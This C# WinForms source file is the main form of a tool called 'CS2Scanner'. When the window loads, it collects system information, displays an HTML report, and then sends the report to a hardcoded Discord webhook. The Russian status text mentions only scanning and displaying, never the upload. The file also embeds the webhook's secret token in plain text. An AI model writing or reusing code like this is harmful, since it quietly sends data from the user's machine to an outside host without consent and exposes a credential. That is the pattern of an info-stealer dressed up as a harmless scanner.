using System;
using System.Diagnostics;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace CS2Scanner
{
    public partial class MainForm : Form
    {
        private const string WebhookUrl = "https://discord.com/api/webhooks/1429778047363452999/W_5Yso3yyYgIOQdRRtbQE4_Zfr4J656wTL2ell9gQGrUeiEC-TTCIhqPPRzoheVRv6E4";

        public MainForm()
        {
            InitializeComponent();
        }

        private async void MainForm_Load(object sender, EventArgs e)
        {
            statusLabel.Text = "Сканирование системы...";
            try
            {
                var stopwatch = Stopwatch.StartNew();
                var collector = new SystemInfoCollector();
                ReportData report = await Task.Run(() => collector.Collect());
                stopwatch.Stop();
                report.ScanTime = FormatElapsed(stopwatch.Elapsed);

                string html = HtmlReportBuilder.Build(report);
                reportBrowser.DocumentText = html;
                statusLabel.Text = "Сканирование завершено. Отчёт отображён.";

                await DiscordWebhookNotifier.SendReportAsync(WebhookUrl, report, html);
            }
            catch (Exception ex)
            {
                statusLabel.Text = "Ошибка: " + ex.Message;
                MessageBox.Show(this, ex.ToString(), "Ошибка сканера", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }

        private static string FormatElapsed(TimeSpan elapsed)
        {
            if (elapsed.TotalSeconds < 60)
            {
                return $"{elapsed.TotalSeconds:F1}s";
            }

            return $"{(int)elapsed.TotalMinutes}m {elapsed.Seconds}s";
        }
    }
}
